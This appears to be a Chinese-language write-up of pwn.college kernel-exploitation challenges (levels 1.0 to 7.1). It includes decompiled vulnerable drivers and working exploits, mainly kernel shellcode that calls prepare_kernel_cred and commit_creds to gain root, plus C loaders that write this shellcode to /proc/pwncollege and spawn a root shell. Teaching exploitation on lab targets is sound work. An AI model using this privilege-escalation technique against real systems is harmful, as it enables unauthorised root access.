## level1.0

启动环境后，内核驱动在 `/challenge` 下，通过 vscode 环境下载到本地分析。

`init_module.c`：

```c
int __cdecl init_module()
{
  __int64 fd; // rbp

  fd = filp_open("/flag", 0LL, 0LL);
  memset(flag, 0, sizeof(flag));
  kernel_read(fd, flag, 128LL, fd + 104);
  filp_close(fd, 0LL);
  proc_entry = (proc_dir_entry *)proc_create("pwncollege", 438LL, 0LL, &fops);
  printk(&unk_BD1);
  printk(&unk_9D0);
  printk(&unk_BD1);
  printk(&unk_A00);
  printk(&unk_A68);
  printk(&unk_AC8);
  printk(&unk_B18);
  printk(&unk_BD8);
  return 0;
}
```

可以看到创建了 `/proc/pwncollege`，这里记录一下 `proc_create` 的作用，可以在 `/proc` 下创建一个文件，用户通过这个文件可以与内核进行交互。

```c
int __fastcall device_open(inode *inode, file *file)
{
  printk(&unk_928);
  return 0;
}

ssize_t __fastcall device_write(file *file, const char *buffer, size_t length, loff_t *offset)
{
  size_t v5; // rdx
  char password[16]; // [rsp+0h] [rbp-28h] BYREF
  unsigned __int64 v8; // [rsp+10h] [rbp-18h]

  v8 = __readgsqword(0x28u);
  printk(&unk_950);
  v5 = 16LL;
  if ( length <= 0x10 )
    v5 = length;
  copy_from_user(password, buffer, v5);
  device_state[0] = (strncmp(password, "gxrgpsxalwuwhrhx", 0x10uLL) == 0) + 1;
  return length;
}

ssize_t __fastcall device_read(file *file, char *buffer, size_t length, loff_t *offset)
{
  const char *v6; // rsi
  size_t v7; // rdx
  unsigned __int64 v8; // rax

  printk(&unk_990);
  v6 = flag;
  if ( device_state[0] != 2 )
  {
    v6 = "device error: unknown state\n";
    if ( device_state[0] <= 2 )
    {
      v6 = "password:\n";
      if ( device_state[0] )
      {
        v6 = "device error: unknown state\n";
        if ( device_state[0] == 1 )
        {
          device_state[0] = 0;
          v6 = "invalid password\n";
        }
      }
    }
  }
  v7 = length;
  v8 = strlen(v6) + 1;
  if ( v8 - 1 <= length )
    v7 = v8 - 1;
  return v8 - 1 - copy_to_user(buffer, v6, v7);
}
```

可以看到只需要 `device_write` 将 `device_state[0]` 修改为 `2`，然后就可以得到 flag 了。

exp:

```c
# include <stdio.h>
# include <fcntl.h>

int main() {
    char flag[100];
    int fd = open("/proc/pwncollege", 2);
    write(fd, "gxrgpsxalwuwhrhx", 16);
    read(fd, flag, 0x100);
    printf("%s", flag);
    return 0;
}
```

## level 1.1

和 1.0 比较类似，不再赘述。

## level 2.0

设备驱动里没有 `read` 函数，程序逻辑是字符串校验通过后直接 `printk` flag，因此可以通过 `dmesg` 查看 flag

## level 2.1

同上。

## level 3.0

题目里的 `win` 函数使用了两个很重要的提权函数，一个是 `prepare_kernel_cred`，另一个是 `commit_creds`，第一个函数源码如下：

```c
/**
 * prepare_kernel_cred - Prepare a set of credentials for a kernel service
 * @daemon: A userspace daemon to be used as a reference
 *
 * Prepare a set of credentials for a kernel service.  This can then be used to
 * override a task's own credentials so that work can be done on behalf of that
 * task that requires a different subjective context.
 *
 * @daemon is used to provide a base for the security record, but can be NULL.
 * If @daemon is supplied, then the security data will be derived from that;
 * otherwise they'll be set to 0 and no groups, full capabilities and no keys.
 *
 * The caller may change these controls afterwards if desired.
 *
 * Returns the new credentials or NULL if out of memory.
 *
 * Does not take, and does not return holding current->cred_replace_mutex.
 */
struct cred *prepare_kernel_cred(struct task_struct *daemon)
{
	const struct cred *old;
	struct cred *new;

	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
	if (!new)
		return NULL;

	kdebug("prepare_kernel_cred() alloc %p", new);

	if (daemon)
		old = get_task_cred(daemon);
	else
		old = get_cred(&init_cred);  // 正常来讲 daemon 为 NULL 就会执行这里

	validate_creds(old);

	*new = *old;
	atomic_set(&new->usage, 1);
	set_cred_subscribers(new, 0);
	get_uid(new->user);
	get_user_ns(new->user_ns);
	get_group_info(new->group_info);

#ifdef CONFIG_KEYS
	new->session_keyring = NULL;
	new->process_keyring = NULL;
	new->thread_keyring = NULL;
	new->request_key_auth = NULL;
	new->jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;
#endif

#ifdef CONFIG_SECURITY
	new->security = NULL;
#endif
	if (security_prepare_creds(new, old, GFP_KERNEL) < 0)
		goto error;

	put_cred(old);
	validate_creds(new);
	return new;

error:
	put_cred(new);
	put_cred(old);
	return NULL;
}
EXPORT_SYMBOL(prepare_kernel_cred);
```


可以创建一个 cred 结构体，`init_cred` 结构如下：

```c
/*
 * The initial credentials for the initial task
 */
struct cred init_cred = {
	.usage			= ATOMIC_INIT(4),
#ifdef CONFIG_DEBUG_CREDENTIALS
	.subscribers		= ATOMIC_INIT(2),
	.magic			= CRED_MAGIC,
#endif
	.uid			= GLOBAL_ROOT_UID,
	.gid			= GLOBAL_ROOT_GID,
	.suid			= GLOBAL_ROOT_UID,
	.sgid			= GLOBAL_ROOT_GID,
	.euid			= GLOBAL_ROOT_UID,
	.egid			= GLOBAL_ROOT_GID,
	.fsuid			= GLOBAL_ROOT_UID,
	.fsgid			= GLOBAL_ROOT_GID,
	.securebits		= SECUREBITS_DEFAULT,
	.cap_inheritable	= CAP_EMPTY_SET,
	.cap_permitted		= CAP_FULL_SET,
	.cap_effective		= CAP_FULL_SET,
	.cap_bset		= CAP_FULL_SET,
	.user			= INIT_USER,
	.user_ns		= &init_user_ns,
	.group_info		= &init_groups,
};
```

注意到其中的 uid 是 root 对应的 0。

```c
/**
 * commit_creds - Install new credentials upon the current task
 * @new: The credentials to be assigned
 *
 * Install a new set of credentials to the current task, using RCU to replace
 * the old set.  Both the objective and the subjective credentials pointers are
 * updated.  This function may not be called if the subjective credentials are
 * in an overridden state.
 *
 * This function eats the caller's reference to the new credentials.
 *
 * Always returns 0 thus allowing this function to be tail-called at the end
 * of, say, sys_setgid().
 */
int commit_creds(struct cred *new)
{
	struct task_struct *task = current;
	const struct cred *old = task->real_cred;

	kdebug("commit_creds(%p{%d,%d})", new,
	       atomic_read(&new->usage),
	       read_cred_subscribers(new));

	BUG_ON(task->cred != old);
#ifdef CONFIG_DEBUG_CREDENTIALS
	BUG_ON(read_cred_subscribers(old) < 2);
	validate_creds(old);
	validate_creds(new);
#endif
	BUG_ON(atomic_read(&new->usage) < 1);

	get_cred(new); /* we will require a ref for the subj creds too */

	/* dumpability changes */
	if (!uid_eq(old->euid, new->euid) ||
	    !gid_eq(old->egid, new->egid) ||
	    !uid_eq(old->fsuid, new->fsuid) ||
	    !gid_eq(old->fsgid, new->fsgid) ||
	    !cred_cap_issubset(old, new)) {
		if (task->mm)
			set_dumpable(task->mm, suid_dumpable);
		task->pdeath_signal = 0;
		smp_wmb();
	}

	/* alter the thread keyring */
	if (!uid_eq(new->fsuid, old->fsuid))
		key_fsuid_changed(task);
	if (!gid_eq(new->fsgid, old->fsgid))
		key_fsgid_changed(task);

	/* do it
	 * RLIMIT_NPROC limits on user->processes have already been checked
	 * in set_user().
	 */
	alter_cred_subscribers(new, 2);
	if (new->user != old->user)
		atomic_inc(&new->user->processes);
	rcu_assign_pointer(task->real_cred, new);
	rcu_assign_pointer(task->cred, new);
	if (new->user != old->user)
		atomic_dec(&old->user->processes);
	alter_cred_subscribers(old, -2);

	/* send notifications */
	if (!uid_eq(new->uid,   old->uid)  ||
	    !uid_eq(new->euid,  old->euid) ||
	    !uid_eq(new->suid,  old->suid) ||
	    !uid_eq(new->fsuid, old->fsuid))
		proc_id_connector(task, PROC_EVENT_UID);

	if (!gid_eq(new->gid,   old->gid)  ||
	    !gid_eq(new->egid,  old->egid) ||
	    !gid_eq(new->sgid,  old->sgid) ||
	    !gid_eq(new->fsgid, old->fsgid))
		proc_id_connector(task, PROC_EVENT_GID);

	/* release the old obj and subj refs both */
	put_cred(old);
	put_cred(old);
	return 0;
}
EXPORT_SYMBOL(commit_creds);
```

然后用 `commit_creds` 把这个 `init_cred` 提交到当前进程上，这样当前进程就相当于有了 root 权限，之后就可以弹一个 shell 且这个 shell 具有 root 权限。


## level 3.1

和上面很类似，不再赘述。

## level 4.0

设备没有注册 write 函数，需要使用 `ioctl` 和设备交互。

`ioctl` 是一个专用于设备输入输出操作的一个系统调用，其调用方式如下：

```c
int ioctl(int fd, unsigned long request, ...)
```

然后就可以提权啦


## level 4.1

和上一道题类似，不过 fops 结构体里没有定义 `device_open`，所以一开始有点晕。

## level 5.0

```c
__int64 __fastcall device_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)
{
  __int64 result; // rax

  printk(&unk_9A8);
  result = -1LL;
  if ( cmd == 1337 )
  {
    ((void (__fastcall *)(void *, file *))arg)(&unk_9A8, file);
    return 0LL;
  }
  return result;
}
```

然后找一下 `win` 的地址，不知道为啥远程环境虽然没开 kaslr，但是 kallsym 里的地址全是 0 且 `/proc/sys/kernel/kptr_restrict` 也是 0。

不过模块加载的基地址是 0xffffffffc0000000，这个地址加上 ida 看到的偏移也能正常拿到 shell。


## level 5.1 

和上一题基本没区别，改一下 `win` 的地址就好了。


## level 6.0

相当于是 kernel shellcode，要求实现之前的 `win` 函数。

直接手写汇编：

```asm
; gcc -c exp.s -o exp.o
; ld -e _start -z noexecstack exp.o -o exp

    .intel_syntax noprefix
    .text
    .globl  _start
    .type   _start, @function

_start:
    push 0xffffffff81089660 ; prepare_kernel_cred
    pop rbx
    xor rdi, rdi
    call rbx
    push rax
    pop rdi
    push 0xffffffff81089310 ; commit_creds
    pop rbx
    call rbx
```

编译得到 exp 可执行文件，然后剥离 shellcode。

```
$ objcopy -O binary --only-section=.text exp exp.bin
$ xxd -i exp.bin
unsigned char exp_bin[] = {
0x68, 0x60, 0x96, 0x08, 0x81, 0x5b, 0x48, 0x31, 0xff, 0xff, 0xd3, 0x50,
0x5f, 0x68, 0x10, 0x93, 0x08, 0x81, 0x5b, 0xff, 0xd3
};
unsigned int exp_bin_len = 21;
```

然后编写 exp.c 如下：

```c
// musl-gcc exp.c -o exp2 -static
# include <stdio.h>
# include <fcntl.h>
# include <stdlib.h>
# include <unistd.h>
// prepare: ffffffff81089660
// commit: ffffffff81089310

unsigned char exp_bin[] = {
0x68, 0x60, 0x96, 0x08, 0x81, 0x5b, 0x48, 0x31, 0xff, 0xff, 0xd3, 0x50,
0x5f, 0x68, 0x10, 0x93, 0x08, 0x81, 0x5b, 0xff, 0xd3
};
unsigned int exp_bin_len = 21;
int main() {
    char flag[100];
    int fd = open("/proc/pwncollege", 2);
    printf("%d\n", fd);
    int res = write(fd, exp_bin, exp_bin_len);
    printf("%d\n", res);
    system("/bin/sh");
    return 0;
}
```

然后使用 sftp 将可执行文件传入到远程服务器里执行即可拿到提权后的 shell。

tips：可以在 practice 模式里使用 sudo 查看 kallsyms 里的函数地址（没开 kaslr

## level 6.1

用 6.0 的 exp 直接可以打通。

## level 7.0

```c
__int64 __fastcall device_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)
{
  __int64 result; // rax
  size_t shellcode_length; // [rsp+0h] [rbp-28h] BYREF
  void (*shellcode_execute_addr[4])(void); // [rsp+8h] [rbp-20h] BYREF

  shellcode_execute_addr[1] = (void (*)(void))__readgsqword(0x28u);
  printk(&unk_2A0);
  result = -1LL;
  if ( cmd == 1337 )
  {
    copy_from_user(&shellcode_length, arg, 8LL);
    copy_from_user(shellcode_execute_addr, arg + 4104, 8LL);
    result = -2LL;
    if ( shellcode_length <= 4096 )
    {
      copy_from_user(shellcode, arg + 8, shellcode_length);
      shellcode_execute_addr[0]();
      return 0LL;
    }
  }
  return result;
}
```

相当于要写一个 shellcode，其中：

- shellcode[0:7] 是 shellcode_len
- shellcode[8:4096+8] 是 shellcode
- shellcode[4096+8:] 是 shellcode_addr

这里 shellcode_addr 虽然在 ida 里查看到是在模块的 bss 段上，但调试得到地址其实是 0xffffc90000085000。

提权部分依然使用 6.0 的 shellcode，但是注意提权后要 getshell（因为这个 shellcode 不会自动返回），所以最简单的办法是提权后直接 ret。

```asm
    .intel_syntax noprefix
    .text
    .globl  _start
    .type   _start, @function

_start:
    push 0xffffffff81089660
    pop rbx
    xor rdi, rdi
    call rbx
    push rax
    pop rdi
    push 0xffffffff81089310
    pop rbx
    call rbx
    ret
```

剩下都是一样的。

## level 7.1

用 7.0 的 exp 可以打通。

## level 8.0

